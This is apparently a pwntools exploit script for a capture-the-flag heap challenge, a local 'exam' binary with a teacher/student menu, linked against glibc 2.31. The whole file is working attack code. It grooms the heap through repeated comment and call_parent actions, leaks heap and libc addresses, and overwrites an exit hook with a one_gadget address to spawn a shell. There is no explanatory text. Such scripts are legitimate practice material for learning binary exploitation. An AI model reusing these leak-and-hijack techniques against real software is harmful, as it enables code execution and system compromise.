from pwn import *
filename="./exam"
libc_name="/home/nicholas/glibc-all-in-one/libs/libc6_2.31_0ubuntu9.2_amd64/libc.so.6"
io = process(filename)
context.log_level='debug'
elf=ELF(filename)
libc=ELF(libc_name)
context.terminal=['tmux','split','-hp','60']


def change_role(role):
    io.recvuntil('choice>> ')
    io.sendline(str(5))
    io.recvuntil('role: <0.teacher/1.student>: ')
    io.sendline(str(role))

def add_student(qnum):
    io.recvuntil('choice>> ')
    io.sendline(str(1))
    io.recvuntil('enter the number of questions: ')
    io.sendline(str(qnum))


def give_score():
    io.recvuntil('choice>> ')
    io.sendline(str(2))

def comment(id,size,comment):
    io.recvuntil('choice>> ')
    io.sendline(str(3))
    io.recvuntil('which one? > ')
    io.sendline(str(id))
    io.recvuntil('please input the size of comment: ')
    io.sendline(str(size))
    io.recvuntil('enter your comment:')
    io.send(comment)


def call_parent(id):
    io.recvuntil('choice>> ')
    io.sendline(str(4))
    io.recvuntil('which student id to choose?')
    io.sendline(str(id))


def check():
    io.recvuntil('choice>> ')
    io.sendline(str(2))
    

def pray():
    io.recvuntil('choice>> ')
    io.sendline(str(3))


def change_id(id):
    io.recvuntil('choice>> ')
    io.sendline(str(6))
    io.recvuntil('input your id: ')
    io.sendline(str(id))

def setmode(prayed,score=0,mode="aaa"):
    io.recvuntil('choice>> ')
    io.sendline(str(4))
    if(prayed == 1): # prayed
        io.recvuntil('enter your pray score: 0 to 100')
        io.sendline(str(score))
    else: # not prayed
        io.recvuntil('enter your mode!')
        io.send(mode)

def quit(content):
    io.recvuntil('choice>> ')
    io.sendline(str(6))
    io.recvuntil('never pray again!')
    io.sendline(content)

def debug():
    cmd = ""
    cmd += "b menu_student\n"
    cmd += "b menu_teacher\n"
    cmd += "b call_parent\n"
    cmd +="b setmode\n"
    cmd +="b quit\n"
    # cmd += "brva 0x1D1B\n"
    gdb.attach(io,cmd)

io.recvuntil('role: <0.teacher/1.student>: ')
io.sendline('0')
add_student(1) # add 1 idx0
change_role(1)
setmode(0,100,"ccc")
pray()
change_role(0)
add_student(1) # add 1 idx1
add_student(1) # add 1 idx2
add_student(1) # do sth idx3
add_student(1) # do sth idx4
add_student(1) # idx5
add_student(1) # idx6
# add_student(1) # idx7
# add_student(1) # idx8


change_role(1)
change_id(1)
pray()
change_id(2)
pray()
change_id(3)
pray()
change_id(4)
pray()
change_id(5)
pray()


change_role(0)
give_score()
comment(0,0x3ff,"ccc")
comment(1,0x3ff,"ccc")
comment(2,0x3ff,"ccc")
comment(3,0x3ff,"ccc")
comment(4,0x300,"ccc")
# call_parent(1)
# call_parent(2)
# call_parent(3)


# debug()
change_role(1)
check() # get heap
io.recvuntil('Good Job! Here is your reward! ')
heap_info = int(io.recvuntil('\n',drop=True),16)
success("heap_info: " + hex(heap_info))
heap_base = heap_info - 0x0002a0
success("heap_base: " + hex(heap_base))
write_place = heap_base + 0x8e
io.recvuntil('addr:')
io.send(str(write_place)) # now is 1

change_id(1)
check()
io.recvuntil('addr:')
io.send(str(write_place)) # now is 2

change_id(2)
check()
io.recvuntil('addr:')
io.send(str(write_place)) # now is 3

change_id(3)
check()
io.recvuntil('addr:')
io.send(str(write_place)) # now is 4

change_id(4)
check()
io.recvuntil('addr:')
io.send(str(write_place)) # now is 5


# debug()
change_role(0)
call_parent(1) # now is 6  idx1 die
call_parent(2) # now is 7  idx2 die
# debug()
call_parent(3) #put into unsortedbin  idx3 die



debug()
change_role(1)
change_id(5)
check()
io.recvuntil('addr:')
io.send(str(heap_base + 0x001128)) # add to mmaped place

# debug()
change_role(0)
comment(6,0x3ff,'\x00')
call_parent(4)

change_role(1)
change_id(6)
check() # get libc


libc_info = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
success("libc_info: " + hex(libc_info))
libc_base = libc_info - 0x1ebb00
success("libc_base: " + hex(libc_base))
# debug()
# use pray to edit
change_id(0)
# use id 0 to write pray
# debug()
setmode(1,0x8)
pray() # become normal
exit_hook = 0x222f68
setmode(0,score=0,mode=p64(libc_base+exit_hook))
og = [0xe6c7e,0xe6c81,0xe6c84]
change_role(0)
debug()
quit(p64(og[0]+libc_base))






io.interactive()

